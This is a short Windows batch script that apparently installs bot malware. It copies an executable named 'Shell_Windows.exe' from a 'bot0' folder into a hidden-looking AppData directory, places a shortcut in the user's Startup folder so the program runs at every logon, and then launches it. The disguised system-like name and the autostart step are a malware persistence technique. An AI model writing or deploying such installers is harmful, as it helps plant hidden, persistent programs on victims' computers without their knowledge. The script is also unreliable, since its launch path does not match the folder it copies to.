@ECHO off 
cd %appdata%\Microsoft\Windows && mkdir pov
copy "C:\bot0\Shell_Windows.exe" "%appdata%\Microsoft\Windows\pov\Shell_Windows.exe"
copy "C:\bot0\Shell_Windows.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Shell_Windows.lnk"
"%appdata%\Microsoft\pov\Shell_Windows.exe "
pause
